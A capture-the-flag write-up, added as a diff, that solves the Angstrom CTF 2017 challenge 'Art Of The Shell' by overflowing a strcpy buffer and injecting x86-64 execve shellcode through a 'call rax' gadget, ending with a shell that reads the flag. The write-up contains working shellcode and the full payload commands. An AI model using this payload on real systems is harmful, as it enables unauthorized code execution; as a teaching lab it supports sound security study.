@@ -1,0 +1,124 @@
+:: Exploit/Writeup for the Angstrom CTF 2017, Binary, 80, Art Of The Shell
+::
+:: URL: angstromctf.com
+:.--------------------------------------------------------------------------------------------- :
+:.. By Asger Friis-Vigh of Rota Galaxy, April 2017 .............................................:
+
+
+* Run <file> on the bin to learn which VM to setup for it:
+
+art_of_the_shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad5f009fab7e9dbe9094f15cdeb42737e74d6233, not stripped
+
+* After reading the C code there's a simple stack overflow/smash at:
+
+void vuln(char *input)
+{
+	char buf[64];
+	strcpy(buf, input);
+}
+
+* So I try to enter a little more than 64 bytes:
+
+$ python -c 'print "A"*64 + "B"*16' > ~/overflow.bin
+
+$ ./art_of_the_shell $(cat overflow.bin)
+
+* It crashes, but I'd like to see exactly where using IDA Pro ..
+
+
+* After some trouble shooting I figure out that I need to use <gdbserver>, since IDA would otherwise use the parameters without resolving them first (which makes perfect sense).
+
+$ gdbserver :12345 ./art_of_the_shell `cat overflow.bin`
+
+or:
+
+$ gdbserver :12345 ./art_of_the_shell $(cat overflow.bin)
+
+
+* Thought about the description of the challenge, and how a shell isn't present in the bin itself, so we probably need to inject our own. Since this is a beginner's task I also figure that ROP probably isn't needed, but let's verify this ...
+
+* I download "checksec.sh" (fra https://raw.githubusercontent.com/RobinDavid/checksec/master/checksec.sh) to check the security settings:
+
+$ ./checksec.sh --file art_of_the_shell 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   art_of_the_shell
+
+* So the stack is executable, there's no stack cookie/canary, etc.
+
+* I find some old shell code for a quick shell (I can't remember where I found it, sorry):
+
+shellcode = "
+\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+
+
+python -c 'print "A"*64 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"' > ~/overflow.bin
+
+$ python -c 'print "A"*64 + "B"*8 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"' > ~/overflow.bin
+
+31 bytes:
+"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+
+
+
+
+* At the time of the overflow The stack looks like:
+
+00007FFFFFFFE480  00000000000003E8  MEMORY:00000000000003E8
+00007FFFFFFFE488  00007FFFFFFFE802  MEMORY:00007FFFFFFFE802
+00007FFFFFFFE490  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE498  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4A0  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4A8  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4B0  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4B8  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4C0  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4C8  4141414141414141  MEMORY:4141414141414141
+00007FFFFFFFE4D0  4242424242424242  MEMORY:4242424242424242
+00007FFFFFFFE4D8  3148F63148FF3148  MEMORY:3148F63148FF3148
+00007FFFFFFFE4E0  2FBB4850C03148D2  MEMORY:2FBB4850C03148D2
+00007FFFFFFFE4E8  5368732F2F6E 6962  MEMORY:5368732F2F6E6962
+00007FFFFFFFE4F0  00050F3BB0E78948  MEMORY:00050F3BB0E78948
+00007FFFFFFFE4F8  00007FFFF7A2FAC0  MEMORY:00007FFFF7A2FAC0
+00007FFFFFFFE500  00007FFFFFFFE5D8  MEMORY:00007FFFFFFFE5D8
+00007FFFFFFFE508  00007FFFFFFFE5D8  MEMORY:00007FFFFFFFE5D8
+00007FFFFFFFE510  0000000200000000  MEMORY:0000000200000000
+00007FFFFFFFE518  0000000000400657  main
+00007FFFFFFFE520  0000000000000000  .strtab:unk_0
+
+* RAX is : 0x00007FFFFFFFE480
+
+* I find a "Call RAX" to leverage from:
+
+.text:00000000004005FA push    rbp
+.text:00000000004005FB mov     rbp, rsp
+.text:00000000004005FE call    rax ; unk_0
+.text:0000000000400600 pop     rbp
+.text:0000000000400601 jmp     register_tm_clones
+.text:0000000000400601 frame_dummy endp
+
+* The idea here is that the CALL RAX will jump into the stack, right where our shell code it. Since NX is disabled we just execute that code right off the stack.
+
+
+* So the final version looks like:
+
+$ python -c 'print "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05" + "A"*(72-31) + "\xFE\x05\x40"' > ~/overflow.bin
+$ ./art_of_the_shell $(cat ~/overflow.bin)
+
+* Spændende ... Lad mig prøve på target ...
+
+teamXXXXXX@shellserver:/problems/art_of_the_shell$ ls -la
+total 32
+drwxr-xr-x 2 art_of_the_shell art_of_the_shell 4096 Apr 21 21:16 .
+drwxr-xr-x 8 root             root             4096 Apr 21 20:58 ..
+-rwsr-sr-x 1 art_of_the_shell art_of_the_shell 8848 Apr 21 20:57 art_of_the_shell
+-rwxr-xr-x 1 art_of_the_shell art_of_the_shell  402 Apr 21 20:55 art_of_the_shell.c
+-rw-r----- 1 art_of_the_shell art_of_the_shell   31 Apr 21 21:16 flag.txt
+-rwxr-xr-x 1 art_of_the_shell art_of_the_shell   82 Apr 21 20:55 Makefile
+teamXXXXXX@shellserver:/problems/art_of_the_shell$ python -c 'print "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05" + "A"*(72-31) + "\xFE\x05\x40"' > ~/overflow.bin
+teamXXXXXX@shellserver:/problems/art_of_the_shell$ ./art_of_the_shell $(cat ~/overflow.bin)
+$ cat flag.txt
+actf{shouldve_used_the_nx_bit}
+$ exit
+teamXXXXXX@shellserver:/problems/art_of_the_shell$ 
+
+* Nice!
